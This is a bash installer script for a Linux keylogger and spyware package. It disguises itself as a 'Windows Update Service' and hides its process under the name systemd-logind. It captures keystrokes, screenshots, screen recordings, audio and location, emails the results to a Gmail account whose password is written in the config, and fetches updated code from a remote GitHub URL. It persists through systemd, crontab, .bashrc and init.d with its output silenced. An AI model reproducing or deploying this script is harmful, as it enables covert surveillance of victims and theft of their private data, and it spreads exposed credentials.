#!/bin/bash
# Linux Keylogger Installation Script

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "============================================================"
echo " LINUX KEYLOGGER INSTALLATION"
echo "============================================================"

# Check root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[ERROR] Please run as root (sudo)$NC"
    exit 1
fi

echo -e "${GREEN}[INFO] Starting installation...$NC"

# Install Python3 if not present
if ! command -v python3 &> /dev/null; then
    echo -e "${YELLOW}[INFO] Installing Python3...$NC"
    apt-get update
    apt-get install -y python3 python3-pip python3-dev
fi

# Install system dependencies
echo -e "${GREEN}[INFO] Installing system dependencies...$NC"
apt-get install -y \
    build-essential \
    python3-venv \
    python3-wheel \
    libx11-dev \
    libxext-dev \
    libxcb1-dev \
    libxcb-shm0-dev \
    libxcb-xfixes0-dev \
    libxcb-randr0-dev \
    libxcb-shape0-dev \
    libxcb-xkb-dev \
    libxkbcommon-dev \
    libxkbcommon-x11-dev \
    x11-utils \
    xdotool \
    xclip \
    recordmydesktop \
    ffmpeg \
    pulseaudio-utils \
    alsa-utils \
    libpulse-dev \
    portaudio19-dev \
    libasound2-dev

# Install Python dependencies
echo -e "${GREEN}[INFO] Installing Python dependencies...$NC"
pip3 install --upgrade pip
pip3 install \
    pynput \
    evdev \
    mss \
    Pillow \
    opencv-python \
    numpy \
    sounddevice \
    soundfile \
    requests \
    pyperclip \
    psutil \
    python-xlib \
    pyaudio \
    pyautogui \
    schedule

# Create directories
echo -e "${GREEN}[INFO] Creating directories...$NC"
mkdir -p /opt/WindowsUpdateService
mkdir -p /etc/windowsupdateservice
mkdir -p /var/log/windowsupdateservice
mkdir -p /var/lib/windowsupdateservice

# Copy script
echo -e "${GREEN}[INFO] Installing main script...$NC"
cp "$0" /opt/WindowsUpdateService/windowsupdateservice.py
chmod +x /opt/WindowsUpdateService/windowsupdateservice.py

# Create config
echo -e "${GREEN}[INFO] Creating configuration...$NC"
cat > /etc/windowsupdateservice/config.ini << 'EOF'
[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/windowsupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
ChecksumURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/checksum.txt
MaxDownloadSizeMB = 100
RetryAttempts = 5
EOF
chmod 600 /etc/windowsupdateservice/config.ini

# Create systemd service
echo -e "${GREEN}[INFO] Creating systemd service...$NC"
cat > /etc/systemd/system/windowsupdateservice.service << 'EOF'
[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle
ProtectSystem=false
ProtectHome=false
NoNewPrivileges=false

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/windowsupdateservice.service

# Reload systemd and enable service
echo -e "${GREEN}[INFO] Enabling and starting service...$NC"
systemctl daemon-reload
systemctl enable windowsupdateservice.service
systemctl start windowsupdateservice.service

# Add to crontab
echo -e "${GREEN}[INFO] Adding to crontab...$NC"
(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden > /dev/null 2>&1") | crontab -

# Add to .bashrc
echo -e "${GREEN}[INFO] Adding to .bashrc...$NC"
if [ -f ~/.bashrc ]; then
    echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/windowsupdateservice.py ] && nohup /usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden > /dev/null 2>&1 &" >> ~/.bashrc
fi

# Create init.d script
echo -e "${GREEN}[INFO] Creating init.d script...$NC"
cat > /etc/init.d/windowsupdateservice << 'EOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          windowsupdateservice
# Required-Start:    $remote_fs $network
# Required-Stop:     $remote_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Windows Update Service
# Description:       Windows Update Service
### END INIT INFO

case "$1" in
    start)
        echo "Starting Windows Update Service..."
        /usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden &
        ;;
    stop)
        echo "Stopping Windows Update Service..."
        pkill -f "windowsupdateservice.py"
        ;;
    status)
        if pgrep -f "windowsupdateservice.py" > /dev/null; then
            echo "Windows Update Service is running"
        else
            echo "Windows Update Service is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|status}"
        exit 1
        ;;
esac

exit 0
EOF

chmod +x /etc/init.d/windowsupdateservice
update-rc.d windowsupdateservice defaults

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN} INSTALLATION COMPLETE!${NC}"
echo -e "${GREEN}============================================================${NC}"
echo " Installed: /opt/WindowsUpdateService/"
echo " Config: /etc/windowsupdateservice/"
echo " Logs: /var/log/windowsupdateservice/"
echo " Data: /var/lib/windowsupdateservice/"
echo ""
echo " Services:"
echo "   systemd: windowsupdateservice.service"
echo "   init.d: /etc/init.d/windowsupdateservice"
echo "   crontab: @reboot"
echo "   .bashrc: ~/.bashrc"
echo ""
echo -e "${GREEN}[OK] Service is running and will start on boot${NC}"
echo "============================================================"
